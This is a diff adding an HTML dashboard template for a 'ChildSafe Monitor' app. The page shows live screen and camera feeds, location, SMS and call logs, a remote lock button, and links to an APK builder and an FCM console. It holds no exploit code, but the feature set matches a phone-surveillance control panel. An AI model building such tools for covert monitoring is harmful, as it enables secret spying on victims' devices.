@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="child-id" content="{{ child_id }}">
+    <title>Dashboard - ChildSafe Monitor</title>
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+    <header>
+        <h1>ChildSafe Dashboard</h1>
+        <nav>
+            <a href="/dashboard">Dashboard</a>
+            <a href="/apk-builder">APK Builder</a>
+            <a href="/fcm-console">FCM Console</a>
+            <button id="logout-button">Logout</button>
+        </nav>
+    </header>
+    <main class="dashboard-grid">
+        <div id="screen-tile" class="tile">
+            <h2>Live Screen</h2>
+            <video id="screen-video" autoplay muted playsinline></video>
+        </div>
+        <div id="camera-tile" class="tile">
+            <h2>Live Camera</h2>
+            <video id="camera-video" autoplay playsinline></video>
+        </div>
+        <div id="map-tile" class="tile">
+            <h2>Live Location</h2>
+            <div id="map"></div>
+        </div>
+        <div id="battery-tile" class="tile">
+            <h2>Device Status</h2>
+            <p>Battery: <span id="battery-level">--</span>%</p>
+        </div>
+        <div id="controls-tile" class="tile">
+            <h2>Remote Control</h2>
+            <button id="lock-button">Lock Device</button>
+        </div>
+        <div id="sms-tile" class="tile">
+            <h2>Recent SMS</h2>
+            <ul id="sms-list"></ul>
+        </div>
+        <div id="call-log-tile" class="tile">
+            <h2>Recent Calls</h2>
+            <ul id="call-log-list"></ul>
+        </div>
+    </main>
+    <script src="/static/ws_client.js"></script>
+    <script src="/static/webrtc_receiver.js"></script>
+
+    <!-- Firebase SDK for DB access -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+    <script src="/static/map_tile.js"></script>
+    <!-- Add Leaflet for map -->
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
+</body>
+</html>
